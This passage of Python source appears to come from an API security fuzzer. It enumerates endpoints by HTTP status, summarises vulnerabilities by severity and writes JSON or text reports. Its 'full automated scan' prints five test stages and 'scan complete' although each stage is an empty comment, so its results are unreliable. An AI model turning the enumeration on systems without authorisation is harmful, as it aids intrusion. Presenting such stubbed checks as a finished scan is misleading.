                url = urljoin(base_url, endpoint)
                response = self.session.get(url, timeout=10)
                
                if response.status_code in [200, 201, 401, 403]:
                    found += 1
                    print(f"\033[92m[+] Found: {endpoint} ({response.status_code})\033[0m")
                    
                    self.results.append({
                        'url': url,
                        'status': response.status_code,
                        'length': len(response.content),
                    })
            except:
                pass
        
        print(f"\n\033[92m[+] Found {found} endpoints\033[0m")
    
    def full_automated_scan(self):
        """Run all tests automatically"""
        print("\n\033[92m[*] Full Automated API Security Scan\033[0m\n")
        
        url = input("\033[97m[?] Target API URL: \033[0m").strip()
        if not url:
            print("\033[91m[!] URL required\033[0m")
            return
        
        print(f"\n\033[97m[*] Running comprehensive scan on: {url}\033[0m\n")
        
        # Run all tests
        print("\033[93m[1/5] REST API Fuzzing...\033[0m")
        # Simplified auto-test
        
        print("\033[93m[2/5] Authentication Testing...\033[0m")
        # Auto tests
        
        print("\033[93m[3/5] Authorization Testing...\033[0m")
        # Auto tests
        
        print("\033[93m[4/5] Rate Limit Testing...\033[0m")
        # Auto tests
        
        print("\033[93m[5/5] Enumeration...\033[0m")
        # Auto tests
        
        print(f"\n\033[92m[+] Automated scan complete!\033[0m")
    
    def display_results(self):
        """Display comprehensive results"""
        if not self.vulnerabilities:
            print(f"\n\033[97m[*] No vulnerabilities detected\033[0m")
            return
        
        print(f"\n\033[96m{'='*70}\033[0m")
        print(f"\033[96mVULNERABILITY SUMMARY\033[0m")
        print(f"\033[96m{'='*70}\033[0m\n")
        
        critical = sum(1 for v in self.vulnerabilities if v.get('severity') == 'CRITICAL')
        high = sum(1 for v in self.vulnerabilities if v.get('severity') == 'HIGH')
        medium = sum(1 for v in self.vulnerabilities if v.get('severity') == 'MEDIUM')
        low = sum(1 for v in self.vulnerabilities if v.get('severity') == 'LOW')
        
        print(f"\033[91m  CRITICAL: {critical}\033[0m")
        print(f"\033[93m  HIGH: {high}\033[0m")
        print(f"\033[96m  MEDIUM: {medium}\033[0m")
        print(f"\033[92m  LOW: {low}\033[0m")
        print(f"\033[97m  Total: {len(self.vulnerabilities)}\033[0m")
        
        print(f"\n\033[96m{'='*70}\033[0m")
    
    def save_results(self, filename: str, format_type: str = 'json'):
        """Save results to file"""
        try:
            if format_type == 'json':
                data = {
                    'scan_info': {
                        'timestamp': datetime.now().isoformat(),
                        'total_vulnerabilities': len(self.vulnerabilities),
                    },
                    'vulnerabilities': self.vulnerabilities,
                }
                
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=2)
            else:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write("="*70 + "\n")
                    f.write("API FUZZER - PROFESSIONAL REPORT\n")
                    f.write("="*70 + "\n\n")
                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                    f.write(f"Total Vulnerabilities: {len(self.vulnerabilities)}\n\n")
                    
                    for i, vuln in enumerate(self.vulnerabilities, 1):
                        f.write(f"[{i}] {vuln.get('severity', 'UNKNOWN')} - {vuln.get('payload_type', 'Unknown')}\n")
                        f.write(f"URL: {vuln.get('url', 'N/A')}\n")
                        f.write(f"Payload: {vuln.get('payload', 'N/A')}\n")
                        if vuln.get('indicators'):
                            f.write("Indicators:\n")
                            for ind in vuln['indicators']:
                                f.write(f"  - {ind}\n")
                        f.write("\n" + "-"*70 + "\n\n")
            
            print(f"\n\033[92m[+] Results saved to: {filename}\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Error saving: {e}\033[0m")

if __name__ == "__main__":
    run()
